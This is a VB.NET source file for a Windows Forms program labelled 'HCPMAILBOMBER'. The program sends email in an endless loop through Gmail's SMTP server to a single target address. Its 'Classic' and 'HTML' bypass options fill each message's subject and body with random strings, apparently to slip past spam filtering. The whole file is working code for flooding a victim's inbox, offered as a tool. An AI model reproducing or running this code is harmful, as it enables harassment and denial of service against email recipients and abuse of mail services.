Imports System.IO
Imports System.Net
Imports System.Net.Mail
Imports System.Text
Imports System.Threading

Public Class main

    'defining some shiet
    Dim pMail As New MailMessage
    Dim pSMTPServer As New Mail.SmtpClient("smtp.gmail.com")
    Dim pStreamReader As System.IO.StreamReader
    Declare Sub Sleep Lib "kernel32" (ByVal milliseconds As Long)
    Dim pFileWriter As StreamWriter
    Dim pTodaysdate As String = String.Format("{0:dd/MM/yyyy}", DateTime.Now)
    Dim pTimeofDay As String

    Dim isBypassChecked As Boolean
    Dim isBomberEnabled As Boolean
    Dim pBomberThread As Thread

    Private Sub main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        pStatus.ForeColor = Color.DarkOrange
    End Sub

    Private Sub pChecker_Tick(sender As Object, e As EventArgs) Handles pChecker.Tick
        pMail.Subject = pTitle.Text
        pMail.Body = pBody.Text


        'checks if checkbox is checked ofc
        If pBypassCheck.Checked = True Then
            pClassicBypass.Enabled = True
            pHTMLBypass.Enabled = True
            isBypassChecked = True
        Else
            pClassicBypass.Enabled = False
            pHTMLBypass.Enabled = False
            isBypassChecked = False
        End If

        'b!g random string function

        If pClassicBypass.Checked = True Then  'Classic bypass
            pMail.IsBodyHtml = False
            Dim pS As String = pBypassList.Classic
            Dim pR As New Random
            Dim pSB As New StringBuilder
            For pI As Integer = 0 To pS.Count
                Dim pIDX As Integer = pR.Next(0, pS.Count)
                pSB.Append(pS.Substring(pIDX, 1))
            Next

            pTitle.Text = pSB.ToString
            pBody.Text = pSB.ToString
        ElseIf pHTMLBypass.Checked = True Then 'HTML bypass
            pMail.IsBodyHtml = True
            Dim pS As String = pBypassList.Classic
            Dim pR As New Random
            Dim pSB As New StringBuilder
            For pI As Integer = 0 To pS.Count
                Dim pIDX As Integer = pR.Next(0, pS.Count)
                pSB.Append(pS.Substring(pIDX, 1))
            Next

            pTitle.Text = pSB.ToString
            pBody.Text = """<!DOCTYPE html>
                            <html>
                                <head>
                                    <meta name='viewport' content='width=device-width, initial-scale=1'>
                                    <style>
                                        body {background-color:#ff00ff;background-repeat:repeat-y;background-position:top left;background-attachment:scroll;}
                                        h1{font-family:Arial, sans-serif;color:#ffffff;background-color:#000000;}
                                        p {font-family:Georgia, serif;font-size:14px;font-style:normal;font-weight:bold;color:#ffffff;background-color:#000000;}
                                    </style>
                                </head>
                                <body>
                                    <h1>HCPMAILBOMBER</h1>
                                    <p>" + pSB.ToString + "</p>
                                </body>
                            </html>
"""
        End If
    End Sub


    Private Sub pSendMail()
        Do
            Threading.Thread.Sleep(1)
            pMail.From = New Mail.MailAddress(pMailFrom.Text)
            pMail.To.Add(pMailFor.Text)
            pSMTPServer.Credentials = New System.Net.NetworkCredential(pMailFrom.Text, pPassFrom.Text)
            pSMTPServer.EnableSsl = True
            pSMTPServer.Send(pMail)

            pMailCount.Invoke(Sub()
                                  pMailCount.Text = pMailCount.Text + 1 'b1g counting method
                              End Sub)
        Loop
    End Sub

    Private Sub pStart_Click(sender As Object, e As EventArgs) Handles pStart.Click
        If pMailFor.Text = "" Then
        Else
            isBomberEnabled = True
            pStatus.ForeColor = Color.FromArgb(76, 209, 55)
            pStatus.Text = "Spamming"
            Threading.Thread.Sleep(100)
            pBomberThread = New Thread(AddressOf Me.pSendMail)
            pBomberThread.Start()
        End If
    End Sub

    Private Sub pStop_Click(sender As Object, e As EventArgs) Handles pStop.Click
        If isBomberEnabled = True Then 'checks if bomber thread is enabled ofc
            pStatus.ForeColor = Color.DarkOrange
            Threading.Thread.Sleep(500)
            pStatus.Text = "Aborting (wait 5 sec)" 'not changing text idk why
            Threading.Thread.Sleep(5000)
            pBomberThread.Abort()
            pStatus.Text = "Idle"
            isBomberEnabled = False
        End If
    End Sub
End Class
